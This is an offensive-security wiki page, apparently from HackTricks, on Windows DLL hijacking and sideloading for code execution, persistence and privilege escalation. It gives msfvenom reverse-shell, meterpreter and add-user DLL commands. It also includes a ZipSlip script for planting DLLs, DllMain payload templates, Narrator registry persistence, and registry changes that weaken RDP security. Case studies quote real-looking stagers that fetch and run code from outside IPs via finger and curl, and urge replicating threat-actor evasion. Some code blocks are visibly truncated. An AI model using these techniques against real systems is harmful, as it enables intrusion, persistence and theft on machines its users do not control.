_body: "# Dll Hijacking\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n\n## Basic Information\n\nDLL Hijacking\
  \ involves manipulating a trusted application into loading a malicious DLL. This term encompasses several tactics like **DLL\
  \ Spoofing, Injection, and Side-Loading**. It's mainly utilized for code execution, achieving persistence, and, less commonly,\
  \ privilege escalation. Despite the focus on escalation here, the method of hijacking remains consistent across objectives.\n\
  \n### Common Techniques\n\nSeveral methods are employed for DLL hijacking, each with its effectiveness depending on the\
  \ application's DLL loading strategy:\n\n1. **DLL Replacement**: Swapping a genuine DLL with a malicious one, optionally\
  \ using DLL Proxying to preserve the original DLL's functionality.\n2. **DLL Search Order Hijacking**: Placing the malicious\
  \ DLL in a search path ahead of the legitimate one, exploiting the application's search pattern.\n3. **Phantom DLL Hijacking**:\
  \ Creating a malicious DLL for an application to load, thinking it's a non-existent required DLL.\n4. **DLL Redirection**:\
  \ Modifying search parameters like `%PATH%` or `.exe.manifest` / `.exe.local` files to direct the application to the malicious\
  \ DLL.\n5. **WinSxS DLL Replacement**: Substituting the legitimate DLL with a malicious counterpart in the WinSxS directory,\
  \ a method often associated with DLL side-loading.\n6. **Relative Path DLL Hijacking**: Placing the malicious DLL in a user-controlled\
  \ directory with the copied application, resembling Binary Proxy Execution techniques.\n\n> [!TIP]\n> For a step-by-step\
  \ chain that layers HTML staging, AES-CTR configs, and .NET implants on top of DLL sideloading, review the workflow below.\n\
  \n{{#ref}}\nadvanced-html-staged-dll-sideloading.md\n{{#endref}}\n\n## Finding missing Dlls\n\nThe most common way to find\
  \ missing Dlls inside a system is running [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from\
  \ sysinternals, **setting** the **following 2 filters**:\n\n![](<../../../images/image (961).png>)\n\n![](<../../../images/image\
  \ (230).png>)\n\nand just show the **File System Activity**:\n\n![](<../../../images/image (153).png>)\n\nIf you are looking\
  \ for **missing dlls in general** you **leave** this running for some **seconds**.\\\nIf you are looking for a **missing\
  \ dll inside an specific executable** you should set **another filter like \"Process Name\" \"contains\" `<exec name>`,\
  \ execute it, and stop capturing events**.\n\n## Exploiting Missing Dlls\n\nIn order to escalate privileges, the best chance\
  \ we have is to be able to **write a dll that a privilege process will try to load** in some of **place where it is going\
  \ to be searched**. Therefore, we will be able to **write** a dll in a **folder** where the **dll is searched before** the\
  \ folder where the **original dll** is (weird case), or we will be able to **write on some folder where the dll is going\
  \ to be searched** and the original **dll doesn't exist** on any folder.\n\n### Dll Search Order\n\n**Inside the** [**Microsoft\
  \ documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)\
  \ **you can find how the Dlls are loaded specifically.**\n\n**Windows applications** look for DLLs by following a set of\
  \ **pre-defined search paths**, adhering to a particular sequence. The issue of DLL hijacking arises when a harmful DLL\
  \ is strategically placed in one of these directories, ensuring it gets loaded before the authentic DLL. A solution to prevent\
  \ this is to ensure the application uses absolute paths when referring to the DLLs it requires.\n\nYou can see the **DLL\
  \ search order on 32-bit** systems below:\n\n1. The directory from which the application loaded.\n2. The system directory.\
  \ Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)\
  \ function to get the path of this directory.(_C:\\Windows\\System32_)\n3. The 16-bit system directory. There is no function\
  \ that obtains the path of this directory, but it is searched. (_C:\\Windows\\System_)\n4. The Windows directory. Use the\
  \ [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)\
  \ function to get the path of this directory.\n   1. (_C:\\Windows_)\n5. The current directory.\n6. The directories that\
  \ are listed in the PATH environment variable. Note that this does not include the per-application path specified by the\
  \ **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.\n\nThat is the **default**\
  \ search order with **SafeDllSearchMode** enabled. When it's disabled the current directory escalates to second place. To\
  \ disable this feature, create the **HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager**\\\\**SafeDllSearchMode**\
  \ registry value and set it to 0 (default is enabled).\n\nIf [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)\
  \ function is called with **LOAD_WITH_ALTERED_SEARCH_PATH** the search begins in the directory of the executable module\
  \ that **LoadLibraryEx** is loading.\n\nFinally, note that **a dll could be loaded indicating the absolute path instead\
  \ just the name**. In that case that dll is **only going to be searched in that path** (if the dll has any dependencies,\
  \ they are going to be searched as just loaded by name).\n\nThere are other ways to alter the ways to alter the search order\
  \ but I'm not going to explain them here.\n\n### Chaining an arbitrary file write into a missing-DLL hijack\n\n1. Use **ProcMon**\
  \ filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) to collect DLL names that\
  \ the process probes but cannot find.\n2. If the binary runs on a **schedule/service**, dropping a DLL with one of those\
  \ names into the **application directory** (search-order entry #1) will be loaded on the next execution. In one .NET scanner\
  \ case the process looked for `hostfxr.dll` in `C:\\samples\\app\\` before loading the real copy from `C:\\Program Files\\\
  dotnet\\fxr\\...`.\n3. Build a payload DLL (e.g. reverse shell) with any export: `msfvenom -p windows/x64/shell_reverse_tcp\
  \ LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.\n4. If your primitive is a **ZipSlip-style arbitrary write**, craft\
  \ a ZIP whose entry escapes the extraction dir so the DLL lands in the app folder:\n\n```python\nimport zipfile\nwith zipfile.ZipFile(\"\
  slip-shell.zip\", \"w\") as z:\n    z.writestr(\"../app/hostfxr.dll\", open(\"hostfxr.dll\",\"rb\").read())\n```\n\n5. Deliver\
  \ the archive to the watched inbox/share; when the scheduled task re-launches the process it loads the malicious DLL and\
  \ executes your code as the service account.\n\n### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath\n\nAn advanced\
  \ way to deterministically influence the DLL search path of a newly created process is to set the DllPath field in RTL_USER_PROCESS_PARAMETERS\
  \ when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process\
  \ that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a\
  \ malicious DLL from that directory.\n\nKey idea\n- Build the process parameters with RtlCreateProcessParametersEx and provide\
  \ a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).\n- Create\
  \ the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied\
  \ DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target\
  \ EXE.\n\nNotes/limitations\n- This affects the child process being created; it is different from SetDllDirectory, which\
  \ affects the current process only.\n- The target must import or LoadLibrary a DLL by name (no absolute path and not using\
  \ LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).\n- KnownDLLs and hardcoded absolute paths cannot be hijacked.\
  \ Forwarded exports and SxS may change precedence.\n\nMinimal C example (ntdll, wide strings, simplified error handling):\n\

  \ (not shown here)\n    return 0;\n}\n```\n\n</details>\n\nOperational usage example\n- Place a malicious xmllite.dll (exporting\
  \ the required functions or proxying to the real one) in your DllPath directory.\n- Launch a signed binary known to look\
  \ up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads\
  \ your DLL.\n\nThis technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher\
  \ drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of\
  \ the attacker’s DLL from a staging directory.\n\n\n#### Exceptions on dll search order from Windows docs\n\nCertain exceptions\
  \ to the standard DLL search order are noted in Windows documentation:\n\n- When a **DLL that shares its name with one already\
  \ loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection\
  \ and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search\
  \ for the DLL**.\n- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system\
  \ will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The\
  \ registry key **HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs** holds a list of these\
  \ known DLLs.\n- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were\
  \ indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.\n\n\
  ### Escalating Privileges\n\n**Requirements**:\n\n- Identify a process that operates or will operate under **different privileges**\
  \ (horizontal or lateral movement), which is **lacking a DLL**.\n- Ensure **write access** is available for any **directory**\
  \ in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within\
  \ the system path.\n\nYeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged\
  \ executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by\
  \ default). But, in misconfigured environments this is possible.\\\nIn the case you are lucky and you find yourself meeting\
  \ the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the\
  \ project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably\
  \ just changing the path of the folder where you have write permissions).\n\nNote that you can **check your permissions\
  \ in a folder** doing:\n\n```bash\naccesschk.exe -dqv \"C:\\Python27\"\nicacls \"C:\\Python27\"\n```\n\nAnd **check permissions\
  \ of all folders inside PATH**:\n\n```bash\nfor %%A in (\"%path:;=\";\"%\") do ( cmd.exe /c icacls \"%%~A\" 2>nul | findstr\
  \ /i \"(F) (M) (W) :\\\" | findstr /i \":\\\\ everyone authenticated users todos %username%\" && echo. )\n```\n\nYou can\
  \ also check the imports of an executable and the exports of a dll with:\n\n```bash\ndumpbin /imports C:\\path\\Tools\\\
  putty\\Putty.exe\ndumpbin /export /path/file.dll\n```\n\nFor a full guide on how to **abuse Dll Hijacking to escalate privileges**\
  \ with permissions to write in a **System Path folder** check:\n\n\n{{#ref}}\nwritable-sys-path-dll-hijacking-privesc.md\n\
  {{#endref}}\n\n### Automated tools\n\n[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will\
  \ check if you have write permissions on any folder inside system PATH.\\\nOther interesting automated tools to discover\
  \ this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._\n\
  \n### Example\n\nIn case you find an exploitable scenario one of the most important things to successfully exploit it would\
  \ be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll\
  \ Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac)\
  \ or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how\
  \ to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\\\
  \nMoreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create\
  \ a **dll with non required functions exported**.\n\n## **Creating and compiling Dlls**\n\n### **Dll Proxifying**\n\nBasically\
  \ a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as\
  \ **exected** by **relaying all the calls to the real library**.\n\nWith the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)\
  \ or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library**\
  \ you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.\n\n###\
  \ **Meterpreter**\n\n**Get rev shell (x64):**\n\n```bash\nmsfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100\
  \ LPORT=4444 -f dll -o msf.dll\n```\n\n**Get a meterpreter (x86):**\n\n```bash\nmsfvenom -p windows/meterpreter/reverse_tcp\
  \ LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll\n```\n\n**Create a user (x86 I didn't see a x64 version):**\n\n```bash\n\
  msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll\n```\n\n### Your own\n\nNote that in several\
  \ cases the Dll that you compile must **export several functions** that are going to be loaded by the victim process, if\
  \ these functions doesn't exist the **binary won't be able to load** them and the **exploit will fail**.\n\n<details>\n\

  \nWindows Narrator.exe still probes a predictable, language-specific localization DLL on start that can be hijacked for\
  \ arbitrary code execution and persistence.\n\nKey facts\n- Probe path (current builds): `%windir%\\System32\\speech_onecore\\\
  engines\\tts\\msttsloc_onecoreenus.dll` (EN-US).\n- Legacy path (older builds): `%windir%\\System32\\speech\\engine\\tts\\\
  msttslocenus.dll`.\n- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)`\
  \ executes. No exports are required.\n\nDiscovery with Procmon\n- Filter: `Process Name is Narrator.exe` and `Operation\
  \ is Load Image` or `CreateFile`.\n- Start Narrator and observe the attempted load of the above path.\n\nMinimal DLL\n```c\n\
  // Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path\nBOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID)\
  \ {\n  if (r == DLL_PROCESS_ATTACH) {\n    // Optional OPSEC: DisableThreadLibraryCalls(h);\n    // Suspend/quiet Narrator\
  \ main thread, then run payload\n    // (see PoC for implementation details)\n  }\n  return TRUE;\n}\n```\n\nOPSEC silence\n\
  - A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`)\
  \ and `SuspendThread` it; continue in your own thread. See PoC for full code.\n\nTrigger and persistence via Accessibility\
  \ configuration\n- User context (HKCU): `reg add \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\"\
  \ /v configuration /t REG_SZ /d \"Narrator\" /f`\n- Winlogon/SYSTEM (HKLM): `reg add \"HKLM\\Software\\Microsoft\\Windows\
  \ NT\\CurrentVersion\\Accessibility\" /v configuration /t REG_SZ /d \"Narrator\" /f`\n- With the above, starting Narrator\
  \ loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator; your DLL executes\
  \ as SYSTEM on the secure desktop.\n\nRDP-triggered SYSTEM execution (lateral movement)\n- Allow classic RDP security layer:\
  \ `reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD\
  \ /d 0 /f`\n- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM\
  \ on the secure desktop.\n- Execution stops when the RDP session closes—inject/migrate promptly.\n\nBring Your Own Accessibility\
  \ (BYOA)\n- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to\
  \ an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the\
  \ Accessibility framework.\n\nNotes\n- Writing under `%windir%\\System32` and changing HKLM values requires admin rights.\n\
  - All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.\n\n## Case Study: CVE-2025-1729 - Privilege\

  \ DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {\n    if (fdwReason == DLL_PROCESS_ATTACH) {\n        //\
  \ Payload: display a message box (proof-of-concept)\n        MessageBoxA(NULL, \"DLL Hijacked!\", \"TPQM\", MB_OK);\n  \
  \  }\n    return TRUE;\n}\n```\n\n### Attack Flow\n\n1. As a standard user, drop `hostfxr.dll` into `C:\\ProgramData\\Lenovo\\\
  TPQM\\Assistant\\`.\n2. Wait for the scheduled task to run at 9:30 AM under the current user's context.\n3. If an administrator\
  \ is logged in when the task executes, the malicious DLL runs in the administrator's session at medium integrity.\n4. Chain\
  \ standard UAC bypass techniques to elevate from medium integrity to SYSTEM privileges.\n\n## Case Study: MSI CustomAction\
  \ Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)\n\nThreat actors frequently pair MSI-based droppers with DLL\
  \ side-loading to execute payloads under a trusted, signed process.\n\nChain overview\n- User downloads MSI. A CustomAction\
  \ runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from\
  \ embedded resources.\n- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example\
  \ pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).\n- When the signed EXE is started, Windows DLL search\
  \ order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).\n\
  \nMSI analysis (what to look for)\n- CustomAction table:\n  - Look for entries that run executables or VBScript. Example\
  \ suspicious pattern: LaunchApplication executing an embedded file in background.\n  - In Orca (Microsoft Orca.exe), inspect\
  \ CustomAction, InstallExecuteSequence and Binary tables.\n- Embedded/split payloads in the MSI CAB:\n  - Administrative\
  \ extract: msiexec /a package.msi /qb TARGETDIR=C:\\out\n  - Or use lessmsi: lessmsi x package.msi C:\\out\n  - Look for\
  \ multiple small fragments that are concatenated and decrypted by a VBScript CustomAction. Common flow:\n\n```vb\n' VBScript\
  \ CustomAction (high level)\n' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)\n' 2) Concatenate\
  \ with ADODB.Stream or FileSystemObject\n' 3) Decrypt using a hardcoded password/key\n' 4) Write reconstructed PE(s) to\
  \ disk (e.g., wsc_proxy.exe and wsc.dll)\n```\n\nPractical sideloading with wsc_proxy.exe\n- Drop these two files in the\
  \ same folder:\n  - wsc_proxy.exe: legitimate signed host (Avast). The process attempts to load wsc.dll by name from its\
  \ directory.\n  - wsc.dll: attacker DLL. If no specific exports are required, DllMain can suffice; otherwise, build a proxy\
  \ DLL and forward required exports to the genuine library while running payload in DllMain.\n- Build a minimal DLL payload:\n\
  \n```c\n// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll\n#include <windows.h>\nBOOL WINAPI DllMain(HINSTANCE\
  \ h, DWORD r, LPVOID) {\n  if (r == DLL_PROCESS_ATTACH) {\n    WinExec(\"cmd.exe /c whoami > %TEMP%\\\\wsc_sideload.txt\"\
  , SW_HIDE);\n  }\n  return TRUE;\n}\n```\n\n- For export requirements, use a proxying framework (e.g., DLLirant/Spartacus)\
  \ to generate a forwarding DLL that also executes your payload.\n\n- This technique relies on DLL name resolution by the\
  \ host binary. If the host uses absolute paths or safe loading flags (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories),\
  \ hijack may fail.\n- KnownDLLs, SxS, and forwarded exports can influence precedence and must be considered during selection\
  \ of the host binary and export set.\n\n## Signed triads + encrypted payloads (ShadowPad case study)\n\nCheck Point described\
  \ how Ink Dragon deploys ShadowPad using a **three-file triad** to blend in with legitimate software while keeping the core\
  \ payload encrypted on disk:\n\n1. **Signed host EXE** – vendors such as AMD, Realtek, or NVIDIA are abused (`vncutil64.exe`,\
  \ `ApplicationLogs.exe`, `msedge_proxyLog.exe`). The attackers rename the executable to look like a Windows binary (for\
  \ example `conhost.exe`), but the Authenticode signature remains valid.\n2. **Malicious loader DLL** – dropped next to the\
  \ EXE with an expected name (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). The DLL is usually an MFC binary\
  \ obfuscated with the ScatterBrain framework; its only job is to locate the encrypted blob, decrypt it, and reflectively\
  \ map ShadowPad.\n3. **Encrypted payload blob** – often stored as `<name>.tmp` in the same directory. After memory-mapping\
  \ the decrypted payload, the loader deletes the TMP file to destroy forensic evidence.\n\nTradecraft notes:\n\n* Renaming\
  \ the signed EXE (while keeping the original `OriginalFileName` in the PE header) lets it masquerade as a Windows binary\
  \ yet retain the vendor signature, so replicate Ink Dragon’s habit of dropping `conhost.exe`-looking binaries that are really\
  \ AMD/NVIDIA utilities.\n* Because the executable stays trusted, most allowlisting controls only need your malicious DLL\
  \ to sit alongside it. Focus on customizing the loader DLL; the signed parent can typically run untouched.\n* ShadowPad’s\
  \ decryptor expects the TMP blob to live next to the loader and be writable so it can zero the file after mapping. Keep\
  \ the directory writable until the payload loads; once in memory the TMP file can safely be deleted for OPSEC.\n\n### LOLBAS\
  \ stager + staged archive sideloading chain (finger → tar/curl → WMI)\n\nOperators pair DLL sideloading with LOLBAS so the\
  \ only custom artifact on disk is the malicious DLL next to the trusted EXE:\n\n- **Remote command loader (Finger):** Hidden\
  \ PowerShell spawns `cmd.exe /c`, pulls commands from a Finger server, and pipes them to `cmd`:\n\n  ```powershell\n  powershell.exe\
  \ Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden\n  ```\n  - `finger user@host`\
  \ pulls TCP/79 text; `| cmd` executes the server response, letting operators rotate second stage server-side.\n\n- **Built-in\
  \ download/extract:** Download an archive with a benign extension, unpack it, and stage the sideload target plus DLL under\
  \ a random `%LocalAppData%` folder:\n\n  ```powershell\n  $base = \"$Env:LocalAppData\"; $dir = Join-Path $base (Get-Random);\
  \ curl -s -L -o \"$dir.pdf\" 79.141.172.212/tcp; mkdir \"$dir\"; tar -xf \"$dir.pdf\" -C \"$dir\"; $exe = \"$dir\\intelbq.exe\"\
  \n  ```\n  - `curl -s -L` hides progress and follows redirects; `tar -xf` uses Windows' built-in tar.\n\n- **WMI/CIM launch:**\
  \ Start the EXE via WMI so telemetry shows a CIM-created process while it loads the colocated DLL:\n\n  ```powershell\n\
  \  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = \"`\"$exe`\"\"}\n  ```\n  - Works\
  \ with binaries that prefer local DLLs (e.g., `intelbq.exe`, `nearby_share.exe`); payload (e.g., Remcos) runs under the\
  \ trusted name.\n\n- **Hunting:** Alert on `forfiles` when `/p`, `/m`, and `/c` appear together; uncommon outside admin\
  \ scripts.\n\n\n## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)\n\nA recent Lotus Blossom\
  \ intrusion abused a trusted update chain to deliver an NSIS-packed dropper that staged a DLL sideload plus fully in-memory\
  \ payloads.\n\nTradecraft flow\n- `update.exe` (NSIS) creates `%AppData%\\Bluetooth`, marks it **HIDDEN**, drops a renamed\
  \ Bitdefender Submission Wizard `BluetoothService.exe`, a malicious `log.dll`, and an encrypted blob `BluetoothService`,\
  \ then launches the EXE.\n- The host EXE imports `log.dll` and calls `LogInit`/`LogWrite`. `LogInit` mmap-loads the blob;\
  \ `LogWrite` decrypts it with a custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material derived from\
  \ a prior hash), overwrites the buffer with plaintext shellcode, frees temps, and jumps to it.\n- To avoid an IAT, the loader\
  \ resolves APIs by hashing export names using **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, then applying a Murmur-style\
  \ avalanche (**0x85EBCA6B**) and comparing against salted target hashes.\n\nMain shellcode (Chrysalis)\n- Decrypts a PE-like\
  \ main module by repeating add/XOR/sub with key `gQ2JR&9;` over five passes, then dynamically loads `Kernel32.dll` → `GetProcAddress`\
  \ to finish import resolution.\n- Reconstructs DLL name strings at runtime via per-character bit-rotate/XOR transforms,\
  \ then loads `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.\n- Uses a second resolver that\
  \ walks the **PEB → InMemoryOrderModuleList**, parses each export table in 4-byte blocks with Murmur-style mixing, and only\
  \ falls back to `GetProcAddress` if the hash is not found.\n\nEmbedded configuration & C2\n- Config lives inside the dropped\
  \ `BluetoothService` file at **offset 0x30808** (size **0x980**) and is RC4-decrypted with key `qwhvb^435h&*7`, revealing\
  \ the C2 URL and User-Agent.\n- Beacons build a dot-delimited host profile, prepend tag `4Q`, then RC4-encrypt with key\
  \ `vAuig34%^325hGV` before `HttpSendRequestA` over HTTPS. Responses are RC4-decrypted and dispatched by a tag switch (`4T`\
  \ shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\\\` uninstall, `4` drive/file enum + chunked transfer\
  \ cases).\n- Execution mode is gated by CLI args: no args = install persistence (service/Run key) pointing to `-i`; `-i`\
  \ relaunches self with `-k`; `-k` skips install and runs payload.\n\nAlternate loader observed\n- The same intrusion dropped\
  \ Tiny C Compiler and executed `svchost.exe -nostdlib -run conf.c` from `C:\\ProgramData\\USOShared\\`, with `libtcc.dll`\
  \ beside it. The attacker-supplied C source embedded shellcode, compiled, and ran in-memory without touching the disk with\
  \ a PE. Replicate with:\n\n```cmd\nC:\\ProgramData\\USOShared\\tcc.exe -nostdlib -run conf.c\n```\n\n- This TCC-based compile-and-run\
  \ stage imported `Wininet.dll` at runtime and pulled a second-stage shellcode from a hardcoded URL, giving a flexible loader\
  \ that masquerades as a compiler run.\n\n## Signed-host sideloading with export proxying + host thread parking\n\nSome DLL\
  \ sideloading chains add **stability engineering** so the legitimate host stays alive long enough to load later stages cleanly\
  \ instead of crashing after the malicious DLL is loaded.\n\nObserved pattern\n- Drop a trusted EXE beside a malicious DLL\
  \ using the expected dependency name such as `version.dll`.\n- The malicious DLL **proxies every expected export** back\
  \ to the real system DLL (for example `%SystemRoot%\\\\System32\\\\version.dll`) so import resolution still succeeds and\
  \ the host process keeps working.\n- After load, the malicious DLL **patches the host entry point** so the main thread falls\
  \ into an infinite `Sleep` loop instead of exiting or running code paths that would terminate the process.\n- A new thread\
  \ performs the real malicious work: decrypting the next-stage DLL name or path (RC4/XOR are common), then launching it with\
  \ `LoadLibrary`.\n\nWhy this matters\n- Normal DLL proxying preserves API compatibility, but it doesn't guarantee the host\
  \ stays alive long enough for later stages.\n- Parking the main thread in `Sleep(INFINITE)` is a simple way to keep the\
  \ signed process resident while the loader performs decryption, staging, or network bootstrap in a worker thread.\n- Hunting\
  \ only for a suspicious `DllMain` miss this pattern if the interesting behavior happens after the host entry point is patched\
  \ and a secondary thread starts.\n\nMinimal workflow\n1. Copy the signed host EXE and determine the DLL it resolves from\
  \ the local directory.\n2. Build a proxy DLL exporting the same functions and forwarding them to the legitimate DLL.\n3.\
  \ In `DllMain(DLL_PROCESS_ATTACH)`, create a worker thread.\n4. From that thread, patch the host entry point or main thread\
  \ start routine so it loops on `Sleep`.\n5. Decrypt the next-stage DLL name/config and call `LoadLibrary` or manual-map\
  \ the payload.\n\nDefensive pivots\n- Signed processes loading `version.dll` or similarly common libraries from their own\
  \ application directory instead of `System32`.\n- Memory patches at the process entry point shortly after image load, especially\
  \ jumps/calls redirected to `Sleep`/`SleepEx`.\n- Threads created by a proxy DLL that immediately call `LoadLibrary` on\
  \ a second DLL with a decrypted name.\n- Full-export proxy DLLs placed next to vendor executables inside writable staging\
  \ directories such as `ProgramData`, `%TEMP%`, or unpacked archive paths.\n\n## References\n\n- [Red Canary – Intelligence\
